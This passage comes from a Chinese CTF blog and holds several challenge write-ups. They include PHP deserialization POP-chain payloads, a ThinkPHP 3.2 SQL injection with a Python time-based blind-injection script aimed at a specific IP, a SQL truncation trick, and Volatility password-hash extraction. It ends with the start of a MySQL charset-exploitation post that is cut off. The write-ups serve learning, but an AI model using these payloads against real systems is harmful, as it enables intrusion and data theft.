<span class="keyword">private</span> $data;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;data);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><p>在 lemo类中调用得的是 normal类 但是在 evil类 中也有在normal类中的相同方法名 action<br>这时可以构造poc链来调用 evil类 中的 action方法<br>payload：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">lemon</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">protected</span> $ClassObj;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;ClassObj = <span class="keyword">new</span> evil();</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">   </span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">normal</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"hello"</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">private</span> $data = <span class="string">"phpinfo()"</span>;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;data);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">$a = <span class="keyword">new</span> lemon;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> serialize($a);</span></span><br></pre></td></tr></table></figure><p>本题也是一道简单的POP链构造,注意的是<br>if($this-&gt;nice-&gt;aaa === $this-&gt;nice-&gt;bbb)<br>因为aaa和bbb一开为null  如果不构造amazing的话 实例化之后也为空 即可绕过if 判断<br>payload如下:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span>  </span></span><br><span class="line"><span class="php">@error_reporting(<span class="number">1</span>); </span></span><br><span class="line"><span class="php"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span></span></span><br><span class="line"><span class="php">&#123;   </span></span><br><span class="line"><span class="php">    <span class="keyword">protected</span> $skyobj;  </span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $aaa;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $bbb;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span></span></span><br><span class="line"><span class="php">    &#123;      </span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;skyobj = <span class="keyword">new</span> cool;</span></span><br><span class="line"><span class="php">    &#125;  </span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>      </span></span></span><br><span class="line"><span class="php">    &#123;          </span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;skyobj))  </span></span><br><span class="line"><span class="php">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;skyobj-&gt;read();      </span></span><br><span class="line"><span class="php">    &#125;  </span></span><br><span class="line"><span class="php">&#125;  </span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">cool</span> </span></span></span><br><span class="line"><span class="php">&#123;    </span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $filename=<span class="string">"flag.php"</span>;     </span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $nice;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $amzing; </span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span>      </span></span></span><br><span class="line"><span class="php">    &#123;   </span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;nice = unserialize(<span class="keyword">$this</span>-&gt;amzing);</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;nice-&gt;aaa = $sth;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;nice-&gt;aaa === <span class="keyword">$this</span>-&gt;nice-&gt;bbb)</span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">            $file = <span class="string">"./&#123;$this-&gt;filename&#125;"</span>;        </span></span><br><span class="line"><span class="php">            <span class="keyword">if</span> (file_get_contents($file))         </span></span><br><span class="line"><span class="php">            &#123;              </span></span><br><span class="line"><span class="php">                <span class="keyword">return</span> file_get_contents($file); </span></span><br><span class="line"><span class="php">            &#125;  </span></span><br><span class="line"><span class="php">            <span class="keyword">else</span> </span></span><br><span class="line"><span class="php">            &#123; </span></span><br><span class="line"><span class="php">                <span class="keyword">return</span> <span class="string">"you must be joking!"</span>; </span></span><br><span class="line"><span class="php">            &#125;    </span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;  </span></span><br><span class="line"><span class="php">&#125;  </span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$a = <span class="keyword">new</span> baby;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> serialize($a);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>另一种做法是看飘零师傅的</p><pre><code>$this-&gt;nice = unserialize($this-&gt;amzing);$this-&gt;nice-&gt;aaa = $sth;if($this-&gt;nice-&gt;aaa === $this-&gt;nice-&gt;bbb)</code></pre><p>aaa会被$sth变量赋值 源码中也没出现这个变量 但同时又要与bbb相等<br>所以使用指针引用 这样bbb的值会随aaa动态改变<br>构造amazing</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span>  </span></span><br><span class="line"><span class="php">@error_reporting(<span class="number">1</span>); </span></span><br><span class="line"><span class="php"><span class="comment">//include 'flag.php';</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span></span></span><br><span class="line"><span class="php">&#123;   </span></span><br><span class="line"><span class="php">    <span class="keyword">protected</span> $skyobj;  </span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $aaa;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $bbb;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span></span></span><br><span class="line"><span class="php">    &#123;      </span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;skyobj = <span class="keyword">new</span> cool;</span></span><br><span class="line"><span class="php">    &#125;  </span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>      </span></span></span><br><span class="line"><span class="php">    &#123;          </span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;skyobj))  </span></span><br><span class="line"><span class="php">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;skyobj-&gt;read();      </span></span><br><span class="line"><span class="php">    &#125;  </span></span><br><span class="line"><span class="php">&#125;  </span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">cool</span> </span></span></span><br><span class="line"><span class="php">&#123;    </span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $filename;     </span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $nice;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $amzing; </span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span>      </span></span></span><br><span class="line"><span class="php">    &#123;   </span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;nice = unserialize(<span class="keyword">$this</span>-&gt;amzing);</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;nice-&gt;aaa = $sth;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;nice-&gt;aaa === <span class="keyword">$this</span>-&gt;nice-&gt;bbb)</span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">            $file = <span class="string">"./&#123;$this-&gt;filename&#125;"</span>;        </span></span><br><span class="line"><span class="php">            <span class="keyword">if</span> (file_get_contents($file))         </span></span><br><span class="line"><span class="php">            &#123;              </span></span><br><span class="line"><span class="php">                <span class="keyword">return</span> file_get_contents($file); </span></span><br><span class="line"><span class="php">            &#125;  </span></span><br><span class="line"><span class="php">            <span class="keyword">else</span> </span></span><br><span class="line"><span class="php">            &#123; </span></span><br><span class="line"><span class="php">                <span class="keyword">return</span> <span class="string">"you must be joking!"</span>; </span></span><br><span class="line"><span class="php">            &#125;    </span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;  </span></span><br><span class="line"><span class="php">&#125;  </span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">sec</span> </span></span></span><br><span class="line"><span class="php">&#123;  </span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span>     </span></span></span><br><span class="line"><span class="php">    &#123;          </span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="string">"it's so sec~~"</span>;      </span></span><br><span class="line"><span class="php">    &#125;  </span></span><br><span class="line"><span class="php">&#125;  </span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$a = <span class="keyword">new</span> baby();</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$a-&gt;bbb = &amp;$a-&gt;aaa;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> serialize($a);</span></span><br></pre></td></tr></table></figure><pre><code>于是$amazing = O:4:&quot;baby&quot;:3:{s:9:&quot;*skyobj&quot;;O:4:&quot;cool&quot;:3:{s:8:&quot;filename&quot;;N;s:4:&quot;nice&quot;;N;s:6:&quot;amzing&quot;;N;}s:3:&quot;aaa&quot;;N;s:3:&quot;bbb&quot;;R:6;}</code></pre><p>最终payload:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span>  </span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span></span></span><br><span class="line"><span class="php">&#123;   </span></span><br><span class="line"><span class="php">    <span class="keyword">protected</span> $skyobj;    </span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $aaa;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $bbb;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span></span></span><br><span class="line"><span class="php">    &#123;          </span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;skyobj = <span class="keyword">new</span> cool;   </span></span><br><span class="line"><span class="php">    &#125;  </span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>      </span></span></span><br><span class="line"><span class="php">    &#123;          </span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;skyobj))  </span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;skyobj-&gt;read();      </span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;  </span></span><br><span class="line"><span class="php">&#125;  </span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">cool</span> </span></span></span><br><span class="line"><span class="php">&#123;    </span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $filename=<span class="string">'flag.php'</span>;     </span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $nice;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $amzing=<span class="string">'O:4:"baby":3:&#123;s:9:"&lt;0x00&gt;*&lt;0x00&gt;skyobj";O:4:"cool":3:&#123;s:8:"filename";N;s:4:"nice";N;s:6:"amzing";N;&#125;s:3:"aaa";N;s:3:"bbb";R:6;&#125;'</span>; </span></span><br><span class="line"><span class="php">&#125;   </span></span><br><span class="line"><span class="php">$a = <span class="keyword">new</span> baby();</span></span><br><span class="line"><span class="php"><span class="comment">// $a-&gt;bbb =&amp;$a-&gt;aaa;</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> (serialize($a));</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><h2 id="simple-php"><a href="#simple-php" class="headerlink" title="simple php"></a>simple php</h2><p><strong>考点</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sql约束攻击</span><br><span class="line">TP注入</span><br></pre></td></tr></table></figure><p>通过用御剑扫描,发现<br>robots.txt</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">User-agent</span>: *</span><br><span class="line"></span><br><span class="line"><span class="attribute">Disallow</span>: /ebooks</span><br><span class="line"><span class="attribute">Disallow</span>: /admin</span><br><span class="line"><span class="attribute">Disallow</span>: /xhtml/?</span><br><span class="line"><span class="attribute">Disallow</span>: /center</span><br></pre></td></tr></table></figure><p>发现有登录和注册页面</p><p><img src="https://ww1.sinaimg.cn/large/007rAy9hgy1fzl6n33ovwj30hd08ptct.jpg" alt="在这里插入图片描述">进行注册后，然后进行登录却提示：<br><img src="https://ww1.sinaimg.cn/large/007rAy9hly1fzl6t155omj30h404jgli.jpg" alt="在这里插入图片描述"><br>然后我们注册admin的账户<br><img src="https://ww1.sinaimg.cn/large/007rAy9hgy1fzl6v0u7l9j30gk04xweg.jpg" alt="在这里插入图片描述"><br>却提示用户已存在，那么现在可以想到注册部分有两个数据库查询操作:先select检测用户名是否存在，若不存在就进行数据库插入操作，若存在就注册失败。登录界面可能是select查询用户名和密码是否正确。这样一般攻击者就会进行注入测试，但是这里并不是想让攻击者在这注入然后拿到admin的密码，来看注册部分的代码select方法使用预处理机制+tp自带的转义，insert部分addslashes转义后入库，那么注册部分基本就不可能注入了。</p><p>在创建字段的时候 如果指定了 字段的长度 可以用sql约束攻击进行绕过<br>学习理解sql约束攻击可以参考这篇文章<br><a href="https://www.freebuf.com/articles/web/124537.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/124537.html</a></p><p>接下来注册账户admin              ‘ (中间有n个空格)，密码11111111</p><p>注册登入成功 发现是一个搜索框<br><img src="https://ww1.sinaimg.cn/large/007rAy9hgy1fzl6vtehy6j30hb076wef.jpg" alt="在这里插入图片描述"></p><p>发现是ThinkPHP3.2 框架<br>百度谷歌搜索 发现有此框架的sql注入漏洞<br>利用参数传入数组类型数据导致绕过过滤导致sql注入</p><p>具体参考:<br><a href="https://xz.aliyun.com/t/2629#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/2629#toc-2</a></p><p>?search[table]=flag where 1 and polygon(id)–<br>分别得到数据库名 表明 字段名</p><p><img src="https://ww1.sinaimg.cn/large/007rAy9hly1fzl6wx8637j30he0323yo.jpg" alt="在这里插入图片描述"><br>发现字段名是flag</p><pre><code>http://101.71.29.5:10004/Admin/User/Index?search[table]=flag where 1 and if(1,sleep(3),0)--</code></pre><p>进行盲注测试 成功延迟<br>exp如下:</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"><span class="built_in">flag</span> = <span class="string">''</span></span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">'PHPSESSID'</span>: <span class="string">'re4g49sil8hfh4ovfrk7ln1o02'</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="built_in">in</span> range(<span class="number">1</span>,<span class="number">33</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="built_in">in</span> <span class="string">'0123456789abcdef'</span>:</span><br><span class="line">        url = <span class="string">'http://101.71.29.5:10004/Admin/User/Index?search[table]=flag where 1 and if((ascii(substr((select flag from flag limit 0,1),'</span>+<span class="built_in">str</span>(i)+<span class="string">',1))='</span>+<span class="built_in">str</span>(ord(j))+<span class="string">'),sleep(3),0)--'</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(url=url,timeout=<span class="number">2.5</span>,cookies=cookies)</span><br><span class="line">        except:</span><br><span class="line">            <span class="built_in">flag</span> += j</span><br><span class="line">            print <span class="built_in">flag</span></span><br><span class="line">            break</span><br></pre></td></tr></table></figure><p>得到flag</p><h2 id="memory"><a href="#memory" class="headerlink" title="memory"></a>memory</h2><p><strong>考点</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">内存镜像分析</span><br><span class="line">Volatility 的使用</span><br></pre></td></tr></table></figure><p>Volatility是一款开源的，基于Python开发的内存取证工具集，可以分析内存中的各种数据。Volatility支持对32位或64位Wnidows、Linux、Mac、Android操作系统的RAM数据进行提取与分析。</p><p>volatility 使用：<br>volatility -f &lt;文件名&gt; –profile=&lt;配置文件&gt; &lt;插件&gt; [插件参数]</p><p>先使用imageinfo插件来猜测dump文件的profile值<br><img src="https://ww1.sinaimg.cn/large/007rAy9hgy1fzl6y3f6oqj30hg04saaw.jpg" alt="在这里插入图片描述"></p><p>得到类型为WinXPSP2x86</p><p>列举缓存在内存的注册表,找到system和sam key的起始位置 ：</p><pre><code>hivelist -f memory -profile=WinXPSP2x86</code></pre><p><img src="https://ww1.sinaimg.cn/large/007rAy9hgy1fzl70b5q9tj30he04gmyf.jpg" alt="在这里插入图片描述"></p><p>选择系统版本, 提取镜像用户信息</p><pre><code>volatility -f memory --profile=WinXPSP2x86 hashdump</code></pre><p>获得Administrator的NThash:c22b315c040ae6e0efee3518d830362b</p><p>得到密码123456789<br>MD5后提交</p><h2 id="赢战2019"><a href="#赢战2019" class="headerlink" title="赢战2019"></a>赢战2019</h2><p><strong>考点</strong></p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">foremost</span> 的使用</span><br><span class="line"><span class="keyword">binwalk </span> 的使用</span><br><span class="line"><span class="symbol">stegsolve</span> 的使用</span><br></pre></td></tr></table></figure><p>用foremost或者binwalk分离得到一张二维码<br>再用stegsolve进行分析得到flag</p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h2 id="键盘之争"><a href="#键盘之争" class="headerlink" title="键盘之争"></a>键盘之争</h2><p><strong>考点</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QWERTY键盘与Dvorak键盘</span><br></pre></td></tr></table></figure><p>百度了一下 了解一下<br>就是该用QWERTY键盘还是Dvorak键盘<br>具体可看<br><a href="http://www.ruanyifeng.com/blog/2006/11/disputation_of_keyboards_qwerty_or_dvorak.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2006/11/disputation_of_keyboards_qwerty_or_dvorak.html</a><br><img src="https://ww1.sinaimg.cn/large/007rAy9hly1fzl72dg5ztj30hi0a2juu.jpg" alt="在这里插入图片描述"><br>QWERTY键盘<br><img src="https://ww1.sinaimg.cn/large/007rAy9hly1fzl738hwmfj30ih069gnw.jpg" alt="在这里插入图片描述"><br>由ypau_kjg;”g;”ypau+  根据映射关系 可得到flag<br>在线解密网址<br><a href="http://wbic16.xedoloh.com/dvorak.html" target="_blank" rel="noopener">http://wbic16.xedoloh.com/dvorak.html</a><br><img src="https://ww1.sinaimg.cn/large/007rAy9hly1fzl73yh2y7j30i509rmzh.jpg" alt="在这里插入图片描述"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.anquanke.com/post/id/170341" target="_blank" rel="noopener">https://www.anquanke.com/post/id/170341</a><br><a href="https://www.freebuf.com/articles/web/124537.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/124537.html</a><br><a href="https://xz.aliyun.com/t/2629" target="_blank" rel="noopener">https://xz.aliyun.com/t/2629</a><br><a href="https://www.freebuf.com/column/152545.html" target="_blank" rel="noopener">https://www.freebuf.com/column/152545.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Mysql字符编码利用技巧</title>
      <link href="/2019/01/12/Mysql%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/"/>
      <url>/2019/01/12/Mysql%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/</url>
      
        <content type="html"><![CDATA[<p>造成这种漏洞的原因是<br>Mysql字段的字符集和php mysqli客户端设置的字符集不相同。</p><h2 id="MySQL字符集介绍"><a href="#MySQL字符集介绍" class="headerlink" title="MySQL字符集介绍"></a>MySQL字符集介绍</h2><p>MySQL服务器可以支持多种字符集，在同一台服务器，同一个数据库，甚至同一个表的不同字段都可以指定使用不同的字符集，相比oracle等其他数据库管理系统，在同一个数据库只能使用相同的字符集，MySQL明显存在更大的灵活性。<br>MySQL提供了不同级别的设置，包括server级、database级、table级、column级，可以提供非常精准的设置。<br>我们在进行编写php文件的时候</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$mysqli</span> = new mysqli(<span class="string">"localhost"</span>, <span class="string">"root"</span>, <span class="string">"root"</span>, <span class="string">"cat"</span>);</span><br><span class="line"></span><br><span class="line"><span class="regexp">/* check connection */</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$mysqli</span>-&gt;connect_errno) &#123;</span><br><span class="line">    printf(<span class="string">"Connect failed: %s\n"</span>, <span class="variable">$mysqli</span>-&gt;connect_error);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$mysqli</span>-&gt;query(<span class="string">"set names utf8"</span>);</span><br></pre></td></tr></table></figure><p>设置了字符集为UTF-8<br>set names utf8 的意思是将客户端的字符集设置为utf8<br>在mysql可以查看<br><img src="http://pkf8r5ond.bkt.clouddn.com/19-1-12/64138853.jpg" alt=""><br>如上图，在默认情况下，mysql字符集为latin1，而执行了set names utf8;以后，character_set_client、character_set_connection、character_set_results等与客户端相关的配置字符集都变成了utf8，但character_set_database、character_set_server等服务端相关的字符集还是latin1。</p><p>这就是该Trick的核心，因为这一条语句，导致客户端、服务端的字符集出现了差别。既然有差别，Mysql在执行查询的时候，就涉及到字符集的转换。</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MySQL Server收到请求时将请求数据从character_<span class="keyword">set</span>_client</span><br><span class="line">转换为character_<span class="keyword">set</span>_connection；</span><br><span class="line">进行内部操作前将请求数据从character_<span class="keyword">set</span>_connection转换为内部操作字符集</span><br></pre></td></tr></table></figure><h1 id="实战一"><a href="#实战一" class="headerlink" title="实战一"></a>实战一</h1><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> ($username === <span class="string">'admin'</span>) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> ($_SERVER[<span class="string">'REMOTE_ADDR'</span>] !== <span class="string">'127.0.0.1'</span>) &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">die</span>(<span class="string">'Permission denied!'</span>);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">$result = $mysqli-&gt;query(<span class="string">"SELECT * FROM z_users where username = '&#123;$username&#125;' and password = 